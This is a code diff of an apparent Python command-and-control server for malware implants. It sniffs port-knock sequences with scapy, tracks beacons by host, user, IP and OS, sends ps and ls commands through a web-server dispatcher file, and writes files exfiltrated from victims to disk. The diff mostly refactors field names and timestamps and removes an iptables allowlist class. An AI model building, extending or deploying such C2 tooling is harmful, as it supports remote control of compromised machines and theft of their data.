@@ -25,7 +25,7 @@ import os
 import re
 import struct
 import threading
-from datetime import datetime
+from datetime import datetime, timezone
 from scapy.all import *
 
 # Destination server and port to sniff the packet
@@ -62,8 +62,6 @@ knocks = {
     'session-end'  : [29900, 29800, 29700],
 }
 
-firewall = None
-
 # file as a c2 command dispatcher
 dispatcher = '/var/www/html/chk-version'
 
@@ -73,7 +71,6 @@ seq = {}        # sequence no. in TCP headers
 
 def pkt_handler(pkt):
     global knocks
-    global firewall
     global c2data
     global seq
     global verbosity
@@ -110,7 +107,6 @@ def pkt_handler(pkt):
                 if is_fully_knocked(k, sip):
                     if verbosity >= 1:
                         printmsg(f'Knock sequence "{k}" received from {sip}')
-                    firewall.allow(sip)
 
                     if k == 'session-start':
                         stage[sip]['session-end'] = -1
@@ -179,38 +175,38 @@ def c2_event(data:dict):
         c2_command_dispatch('nop')
 
     if data['cmd'] == 'chkin':
-        if data['payload']['UUID'] not in beacons:
-            beacons[data['payload']['UUID']] = {**data['payload'], 'first_seen': datetime.utcnow(), 'last_seen': datetime.utcnow()}
+        if data['payload']['uuid'] not in beacons:
+            beacons[data['payload']['uuid']] = {**data['payload'],
+                                                'first_seen': datetime.now(timezone.utc),
+                                                'last_seen': datetime.now(timezone.utc)}
             printmsg(f"New beacon check-in:\n{json.dumps(data['payload'], indent=2)}")
 
         else:
-            beacons[data['payload']['UUID']]['last_seen'] = datetime.utcnow()
+            beacons[data['payload']['uuid']]['last_seen'] = datetime.now(timezone.utc)
             if verbosity >= 1:
-                printmsg(f"Beacon check-in: {data['payload']['Username']} @ {data['payload']['Hostname']} ({data['payload']['IP']})")
+                printmsg(f"Beacon check-in: {data['payload']['user']} @ {data['payload']['host']} ({data['payload']['ip']})")
 
     elif data['cmd'] == 'ps':
-        printmsg(f"Process List ({data['hostname']}):\n{data['payload']}")
+        printmsg(f"Process List ({data['host']}):\n{data['payload']}")
 
     elif data['cmd'] == 'ls':
-        printmsg(f"Directory List ({data['hostname']}):\n{data['payload']}")
+        printmsg(f"Directory List ({data['host']}):\n{data['payload']}")
 
     elif data['cmd'] == 'upload':
-        local_filename = f"data-{data['hostname']}-{data['uuid']}-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}.dat"
+        local_filename = f"data-{data['host']}-{data['uuid']}-{datetime.now(timezone.utc).strftime('%Y%m%d-%H%M%S')}.dat"
 
         with open(local_filename, 'wb') as f:
             f.write(base64.b64decode(data['payload'].encode('utf-8')))
 
-        printmsg(f"Remote file {data['filename']} @ {data['hostname']} received as {local_filename}")
+        printmsg(f"Remote file {data['file']} @ {data['host']} received as {local_filename}")
 
 
 def console_thread():
     """The console thread that handles user inputs"""
     global dport
     global redir_port
-    global firewall
     user_input = ''
 
-    firewall = Firewall(sniff_port=dport, redir_port=redir_port)
     c2_command_dispatch('nop')
     help()
 
@@ -223,7 +219,6 @@ def console_thread():
         else:
             c2_command_dispatch(user_input)
 
-    del firewall
     os._exit(0)
 
 
@@ -251,8 +246,8 @@ def list_beacons():
     printmsg(f"{'UUID':<13} {'Hostname':<18} {'Username':<15} {'IP':<16} {'OS':<8} {'First Seen':<13} {'Last Seen':<13}", stamp=False)
     printmsg(f"{'':-<13} {'':-<18} {'':-<15} {'':-<16} {'':-<8} {'':-<13} {'':-<13}", stamp=False)
     for k in beacons.keys():
-        printmsg(f"{k:<13} {beacons[k]['Hostname']:<18} {beacons[k]['Username']:<15} {beacons[k]['IP']:<16} "\
-                 f"{beacons[k]['OS']:<8} {beacons[k]['first_seen'].strftime('%b-%d %H:%M'):<13} "\
+        printmsg(f"{k:<13} {beacons[k]['host']:<18} {beacons[k]['user']:<15} {beacons[k]['ip']:<16} "\
+                 f"{beacons[k]['os']:<8} {beacons[k]['first_seen'].strftime('%b-%d %H:%M'):<13} "\
                  f"{beacons[k]['last_seen'].strftime('%b-%d %H:%M'):<13}", stamp=False)
 
 
@@ -270,7 +265,7 @@ def c2_command_dispatch(cmdline:str):
     for cmd in c2_commands:
         for k,v in cmd.items():
             if cmdline in v:
-                new_stamp = int(datetime.utcnow().timestamp())
+                new_stamp = int(datetime.now(timezone.utc).timestamp())
 
                 while new_stamp % len(c2_commands) != idx:
                     new_stamp -= 1
@@ -294,7 +289,7 @@ def printmsg(msg:str, stamp=True):
         if i>0 or stamp==False:
             print(f'\n{line}', end='')
         else:
-            print(f'\n[{datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")}] {line}', end='')
+            print(f'\n[{datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")}] {line}', end='')
         i += 1
 
 
@@ -372,7 +367,7 @@ def parse_args():
         check_ephemeral_port()
         os._exit(0)
 
-    return
+    return args
 
 
 def sniffer_thread():
@@ -382,41 +377,6 @@ def sniffer_thread():
 
     printmsg(f'Sniffing packets with filter "{filter}" ...')
     sniff(filter=filter, prn=pkt_handler, store=False, iface=list(conf.ifaces))
-
-
-class Firewall:
-    """A class to apply or lift firewall rules
-    We keep rules in NAT PREROUTING chain only, but jump target DROP or REJECT is not applicable to that chain.
-    Redirecting it to port 0 as a workaround to block."""
-
-    def __init__(self, sniff_port:int, redir_port:int):
-        self.sniff_port = sniff_port
-        self.redir_port = redir_port
-        self.chain = 'SAUCEPOT'
-        self.interface  = 'ens5'
-        self.allowlist = []
-
-        os.system(f'sudo iptables -t nat -N {self.chain}')
-        os.system(f'sudo iptables -t nat -I {self.chain} -i {self.interface} -j RETURN')
-        os.system(f'sudo iptables -t nat -I {self.chain} -i {self.interface} -p tcp -m multiport --dport {self.sniff_port},{self.redir_port} -j REDIRECT --to-port 0')
-        os.system(f'sudo iptables -t nat -I PREROUTING -i {self.interface} -p tcp -m multiport --dport {self.sniff_port},{self.redir_port} -j {self.chain}')
-
-    def __del__(self):
-        ret = 0
-        while ret == 0:
-            ret = os.system(f'sudo iptables -t nat -D PREROUTING -i {self.interface} -p tcp -m multiport --dport {self.sniff_port},{self.redir_port} -j {self.chain} 2>/dev/null')
-
-        os.system(f'sudo iptables -t nat -F {self.chain}')
-        os.system(f'sudo iptables -t nat -X {self.chain}')
-
-
-    def allow(self, src_ip):
-        """Insert iptables rules"""
-        global dport
-
-        if not src_ip in self.allowlist:
-            self.allowlist.append(src_ip)
-            os.system(f'sudo iptables -t nat -I {self.chain} -i {self.interface} -p tcp -s {src_ip} --dport {self.sniff_port} -j REDIRECT --to-port {self.redir_port}')
 
 
 def check_root():
